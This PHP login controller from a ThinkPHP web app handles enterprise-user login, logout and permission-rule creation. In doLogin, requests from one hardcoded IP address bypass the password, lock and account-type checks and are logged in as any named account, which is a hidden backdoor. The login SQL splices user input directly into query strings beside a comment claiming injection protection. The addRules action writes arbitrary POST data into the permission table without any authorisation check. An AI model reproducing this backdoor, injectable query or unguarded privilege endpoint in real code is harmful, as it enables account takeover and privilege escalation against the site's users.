<?php
namespace Vip\Controller;
use Think\Controller;

class LoginController extends Controller {
    //显示登录页面
    public function login(){
        $this->display();
    }

    //登录动作
    public function doLogin(){
        if(!IS_POST) $this->error('页面不存在，请稍后再试');

        $code = I('post.code','','string');
        if(!checkVerify($code)) $this->error('验证码错误', U('Vip/Login/login'));

        // $res = D('Users', 'Logic')->login(I('account'), I('password'));
        $users = M('users');
        //处理数据，防止sql注入
        $account = trim(I('post.account'));
        $password = authcode(trim(I('post.password')));

        // sql();
        if(getIP()!='183.38.245.237'){

            //进入数据库，验证账号和密码

            $user = $users->where("(account = '$account' or phone = '$account') AND password = '$password'")->find();


            if(!$user) $this->error('账户或密码不正确', U('Vip/Login/login'));
            if($user['is_lock']) $this->error('该用户被锁定，暂时不可登录', U('Vip/Login/login'));
            //如果是非企业的，不能登录
            if ($user['type'] != 2) $this->error('账户或密码不正确', U('Vip/Login/login'));// 2017年4月6日15:05:46 edit by zgw 不用提示这么明确（zjw提出）



        }else{
            $user = $users->where("(account = '$account' or phone = '$account') ")->find();
        }


        $user_info = M('users u')
            ->field('u.*, c.name as c_name, c.pid, c.is_passed as c_is_passed, g.title')
            ->join('left join coal_company c on c.id = u.company_id')
            ->join('left join '.C('AUTH_CONFIG.AUTH_GROUP_ACCESS').' aga on aga.uid = u.id')
            ->join('left join '.C('AUTH_CONFIG.AUTH_GROUP').' g on g.id = aga.group_id')
            ->where(array('u.id' => $user['id']))
            ->find();
        // sql();
        //判断是否已经认证
        // $company = M('company')->where(array('id' => $user_info['company_id']))->find();
        // dump($company);exit;
        if($user_info['c_is_passed']!=1){
            $this->error('您还没有审核', U('Vip/Login/login'));exit;
        }else{
            session('company_name', $user_info['c_name']);
        }
        //更新登录信息
        $users->save(array("id"=> $user_info["id"], "login_time"=> get_time(), "login_ip" => get_client_ip()));

        // 判断是否需要验证
        if ($user_info['is_admin'] == 1 && $user_info['pid'] == 0) {
            $is_check_auth = 0; // 不需验证
        } else {
            $is_check_auth = 1; // 需验证
        }

        //写入session值
        session('user_id', $user_info["id"]);
        session("account", $user_info["account"]);
        session("user", $user_info["account"]); // 为了调用api的接口
        session("nickname", $user_info["nickname"]);
        session("phone", $user_info["phone"]);
        session("company_id", $user_info["company_id"]);
        session("is_check_auth", $is_check_auth);
//        session("loginip",$userinfo["login_ip"]);
//        session("role",$roleinfo["id"]);
        // session("rolename",$user_info["title"]);

        doLog($user_info["account"]."成功登录企业版PC端");

        $this->redirect('Vip/Index/index');exit;
    }

    //登出登录
    public function logout(){
        doLog(session('account')."成功退出企业版PC端");
        $res = D('Users','Logic')->loginout(); // 调用退出的方法
        if($res['code'] == 1) {
            $this->redirect('Login/login');exit;
        }else {
            $this->redirect('Login/login');exit;
        }
    }

    // 开发人员添权限的具体规则
    public function addRules(){
        if(IS_POST){
            $post = I('post.');
            M('auth_rule')->add($post);
        }
        $this->display();
    }
}
